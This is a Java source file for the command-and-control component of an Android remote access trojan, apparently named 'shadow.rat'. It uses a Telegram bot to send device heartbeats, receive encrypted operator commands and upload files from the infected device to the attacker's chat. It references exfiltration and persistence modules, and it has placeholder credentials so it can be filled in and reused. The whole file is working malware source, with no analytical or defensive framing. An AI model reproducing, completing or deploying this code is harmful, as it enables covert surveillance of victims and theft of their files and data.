package com.shadow.rat.c2;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import com.shadow.rat.exfiltration.ExfiltrationManager;
import com.shadow.rat.persistence.ConfigManager;
import com.shadow.rat.utils.Logger;
import org.json.JSONObject;
import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendDocument;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.InputFile;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
import java.io.File;
import java.security.SecureRandom;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import android.util.Base64;

public class TelegramC2Manager {
    private static final String TAG = "TelegramC2Manager";
    private static volatile TelegramC2Manager instance;
    
    private final Context context;
    private final ConfigManager configManager;
    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean isRunning = new AtomicBoolean(true);
    private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(2);
    
    private TelegramBot bot;
    private CommandCallback commandCallback;
    private SecretKey encryptionKey;
    private String chatId;
    private String botToken;
    
    @FunctionalInterface
    public interface CommandCallback {
        void onCommand(String command);
    }
    
    public static TelegramC2Manager getInstance(Context context) {
        if (instance == null) {
            synchronized (TelegramC2Manager.class) {
                if (instance == null) {
                    instance = new TelegramC2Manager(context);
                }
            }
        }
        return instance;
    }
    
    private TelegramC2Manager(Context context) {
        this.context = context.getApplicationContext();
        this.configManager = new ConfigManager(context);
        
        // Initialize encryption
        initEncryption();
        
        // Load or generate credentials
        loadCredentials();
    }
    
    private void initEncryption() {
        try {
            String keyStr = configManager.getEncryptionKey();
            if (keyStr == null) {
                // Generate new key
                KeyGenerator keyGen = KeyGenerator.getInstance("AES");
                keyGen.init(256);
                SecretKey key = keyGen.generateKey();
                keyStr = Base64.encodeToString(key.getEncoded(), Base64.DEFAULT);
                configManager.saveEncryptionKey(keyStr);
            }
            
            byte[] keyBytes = Base64.decode(keyStr, Base64.DEFAULT);
            encryptionKey = new SecretKeySpec(keyBytes, "AES");
            
        } catch (Exception e) {
            Logger.e(TAG, "Encryption initialization failed", e);
        }
    }
    
    private void loadCredentials() {
        this.botToken = configManager.getBotToken();
        this.chatId = configManager.getChatId();
        
        if (botToken == null || chatId == null) {
            // Use defaults or generate new
            botToken = "YOUR_BOT_TOKEN";
            chatId = "YOUR_CHAT_ID";
            configManager.saveBotCredentials(botToken, chatId);
        }
    }
    
    public void startListening(CommandCallback callback) {
        this.commandCallback = callback;
        
        try {
            if (bot == null) {
                bot = new TelegramBot();
            }
            
            // Start bot
            scheduler.submit(() -> {
                // Bot runs in its own thread
            });
            
            // Start heartbeat
            startHeartbeat();
            
            Logger.d(TAG, "C2 listening started");
            
        } catch (Exception e) {
            Logger.e(TAG, "Failed to start C2 listener", e);
        }
    }
    
    private void startHeartbeat() {
        scheduler.scheduleAtFixedRate(() -> {
            if (isRunning.get()) {
                sendHeartbeat();
            }
        }, 5, 30, TimeUnit.MINUTES);
    }
    
    public void sendHeartbeat() {
        try {
            JSONObject status = new JSONObject();
            status.put("type", "heartbeat");
            status.put("device_id", configManager.getDeviceId());
            status.put("timestamp", System.currentTimeMillis());
            status.put("uptime", System.currentTimeMillis() - configManager.getStartTime());
            
            sendMessage(status.toString());
            
        } catch (Exception e) {
            Logger.e(TAG, "Heartbeat failed", e);
        }
    }
    
    public void sendMessage(String message) {
        try {
            if (message.length() > 4096) {
                message = message.substring(0, 4093) + "...";
            }
            
            SendMessage sendMessage = new SendMessage();
            sendMessage.setChatId(chatId);
            sendMessage.setText(message);
            sendMessage.enableHtml(true);
            bot.execute(sendMessage);
            
        } catch (TelegramApiException e) {
            Logger.e(TAG, "Failed to send message", e);
        }
    }
    
    public void sendError(String error) {
        sendMessage("⚠️ Error: " + error);
    }
    
    public boolean uploadFile(String filePath, Object task) {
        try {
            File file = new File(filePath);
            if (!file.exists()) {
                return false;
            }
            
            SendDocument document = new SendDocument();
            document.setChatId(chatId);
            document.setDocument(new InputFile(file));
            document.setCaption("File: " + file.getName());
            
            bot.execute(document);
            return true;
            
        } catch (Exception e) {
            Logger.e(TAG, "File upload failed", e);
            return false;
        }
    }
    
    public String encryptMessage(String message) {
        try {
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            byte[] iv = new byte[16];
            new SecureRandom().nextBytes(iv);
            cipher.init(Cipher.ENCRYPT_MODE, encryptionKey, 
                new javax.crypto.spec.IvParameterSpec(iv));
            
            byte[] encrypted = cipher.doFinal(message.getBytes("UTF-8"));
            
            // Combine IV and encrypted data
            byte[] combined = new byte[iv.length + encrypted.length];
            System.arraycopy(iv, 0, combined, 0, iv.length);
            System.arraycopy(encrypted, 0, combined, iv.length, encrypted.length);
            
            return Base64.encodeToString(combined, Base64.DEFAULT);
            
        } catch (Exception e) {
            Logger.e(TAG, "Encryption failed", e);
            return message;
        }
    }
    
    public String decryptMessage(String encryptedMessage) {
        try {
            byte[] combined = Base64.decode(encryptedMessage, Base64.DEFAULT);
            
            // Extract IV and encrypted data
            byte[] iv = new byte[16];
            byte[] encrypted = new byte[combined.length - 16];
            System.arraycopy(combined, 0, iv, 0, 16);
            System.arraycopy(combined, 16, encrypted, 0, encrypted.length);
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, encryptionKey, 
                new javax.crypto.spec.IvParameterSpec(iv));
            
            byte[] decrypted = cipher.doFinal(encrypted);
            return new String(decrypted, "UTF-8");
            
        } catch (Exception e) {
            Logger.e(TAG, "Decryption failed", e);
            return encryptedMessage;
        }
    }
    
    public void shutdown() {
        isRunning.set(false);
        scheduler.shutdownNow();
        if (bot != null) {
            try {
                bot.onClosing();
            } catch (Exception e) {
                // Ignore
            }
        }
    }
    
    private class TelegramBot extends TelegramLongPollingBot {
        @Override
        public String getBotToken() {
            return botToken;
        }
        
        @Override
        public void onUpdateReceived(Update update) {
            if (update.hasMessage() && update.getMessage().hasText()) {
                String messageText = update.getMessage().getText();
                String chatIdFromMessage = update.getMessage().getChatId().toString();
                
                // Verify chat ID
                if (!chatIdFromMessage.equals(chatId)) {
                    return;
                }
                
                // Decrypt if needed
                if (messageText.startsWith("encrypted:")) {
                    messageText = decryptMessage(messageText.substring(10));
                }
                
                // Process command
                if (commandCallback != null) {
                    mainHandler.post(() -> commandCallback.onCommand(messageText));
                }
            }
        }
        
        @Override
        public String getBotUsername() {
            return "ShadowControlBot";
        }
    }
}